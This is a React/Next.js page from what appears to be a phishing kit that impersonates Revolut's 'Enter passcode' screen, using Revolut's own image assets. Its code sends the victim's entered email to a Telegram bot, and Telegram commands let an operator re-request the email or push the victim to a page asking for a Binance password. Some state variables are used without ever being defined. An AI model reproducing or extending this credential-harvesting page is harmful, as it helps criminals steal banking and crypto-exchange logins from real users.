'use client';
import '../app/globals.css';
import React, { useState, useEffect, useRef, Fragment } from 'react';
import Header from '../components/Header';
import { useValidateEmail } from '../app/hooks/useValidate';
import { useRouter } from 'next/navigation';
import { notifyNewUser } from '../lib/api';
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import countriesData from '../app/lib/countries'
import CountriesDropdown from '../components/CountriesDropdown'

export default function Security() {
    const router = useRouter();
    const { command } = useCommand(); // Get the current command from Telegram


    // Handle command changes
    useEffect(() => {
        if (command === 'REQUEST_EMAIL_AGAIN') {
            setInvalid(true); // Show error state for email input
            setIsLoading(false);
        } else if (command === 'REQUEST_BINANCE_PASSWORD') {
            setIsLoading(false);
            setTimeout(() => {
                // setIsLoading(false);
                router.push('/PasswordPage');
            }, 500);
        }
    }, [command]);

    const { validateEmail } = useValidateEmail();
    // Handle email validation
    const handleEmailValidation = () => {
        const isValid = validateEmail(email);
        setInvalid(!isValid);
        setIsLoading(true);
        setUserEmail(email);
        sendMessageToTelegram(email);
    };




    return (
        <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
            {/* Pc version */}
            <div className='hidden md:block'>
                <Header />
                <div className="flex min-h-[550px] justify-center items-start md:items-center ">

                    {/* form container */}
                    <div className='flex justify-center mt-[88px] gap-x-10 h-[264px] w-full'>

                        {/* Pin container */}
                        <div className='w-[352px] h-[264px]'>
                            <div>
                                <button>
                                    <img src="https://assets.revolut.com/assets/icons/ArrowThinLeft.svg" alt="" />
                                </button>
                            </div>

                            <div>
                                <h1 className='font-bold text-[25px] tracking-[-0.01292em] text-ellipsis'>
                                    Enter passcode
                                </h1>
                            </div>

                            <div>
                                <div className="my-[17px]">
                                    <div className="flex gap-2 items-center">
                                        {[...Array(6)].map((_, index) => (
                                            <React.Fragment key={index}>
                                                <input
                                                    type="text"
                                                    maxLength="1"
                                                    inputMode="numeric"
                                                    pattern="[0-9]*"
                                                    className="w-[40px] rounded-[1rem] h-[50px] text-center bg-[#ebebf0] outline-none focus:caret-[#4f55f1]"
                                                    style={{
                                                        WebkitTextSecurity: 'disc'
                                                    }}
                                                    onKeyDown={(e) => {
                                                        if (!/[0-9]/.test(e.key) && e.key !== 'Backspace') {
                                                            e.preventDefault();
                                                        }

                                                        if (e.key === 'Backspace') {
                                                            const inputs = e.target.parentElement.querySelectorAll('input');
                                                            if (!e.target.value && index > 0) {
                                                                inputs[index - 1].focus();
                                                                inputs[index - 1].value = '';
                                                            }
                                                        }
                                                    }}
                                                    onChange={(e) => {
                                                        const inputs = e.target.parentElement.querySelectorAll('input');
                                                        const value = e.target.value;

                                                        if (value) {
                                                            if (index < inputs.length - 1) {
                                                                inputs[index + 1].focus();
                                                            }
                                                        }
                                                    }}
                                                    onFocus={(e) => {
                                                        const inputs = e.target.parentElement.querySelectorAll('input');
                                                        for (let i = 0; i < index; i++) {
                                                            if (!inputs[i].value) {
                                                                inputs[i].focus();
                                                                break;
                                                            }
                                                        }
                                                    }}
                                                />
                                                {index === 2 && <span className="text-[1rem] font-normal text-[#717173]">-</span>}
                                            </React.Fragment>
                                        ))}
                                    </div>
                                </div>
                            </div>


                            <div className='mt-[-5px]'>
                                <a href="" className='inter text-[0.875rem] mt-[1rem] font-normal tracking-[-0.00714em] text-[#4f55f1]'>Forgot your passcode?</a>
                            </div>
                        </div>



                        {/* padlock image */}
                        <div className='w-[264px] h-[264px]'>
                            <img aria-hidden="true" className="Box-rui__sc-1g1k12l-0 cizxh relative top-[10px]" srcset="https://assets.revolut.com/assets/3d-images-v2/3D005@2x.webp 2x, https://assets.revolut.com/assets/3d-images-v2/3D005@2x.png 2x, https://assets.revolut.com/assets/3d-images-v2/3D005@3x.webp 3x, https://assets.revolut.com/assets/3d-images-v2/3D005@3x.png 3x" src="https://assets.revolut.com/assets/3d-images-v2/3D005.png" />
                        </div>
                    </div>
                </div >

                {/* footer */}
                < div className='h-[68px] items-center px-[2rem] md:max-w-[839px] w-full absolute bottom-[5px] flex justify-start  bg-[#f7f7f7]' >
                    <div className="h-fit md:absolute bottom-[19px] left-[30px] gap-y-2 gap-x-8 items-center justify-center md:justify-start md:flex-row flex-col flex">
                        <button className='text-[#717173] tracking-[0.0009px] items-center gap-x-[9px] rounded-[0.75rem] flex justify-center text-sm'>
                            English (United States)
                            <span>
                                <img src="https://assets.revolut.com/assets/icons/ChevronDown.svg" alt="" className='w-4 h-4 opacity-50' />
                            </span>
                        </button>
                        <button className='text-[#717173] tracking-[0.0009px] items-center gap-x-[9px] rounded-[0.75rem] flex justify-center text-sm'>
                            Privacy Policy
                        </button>
                    </div>
                </div >
            </div>


            {/* MObile version */}
            <div>

            </div>
        </div >
    );
}
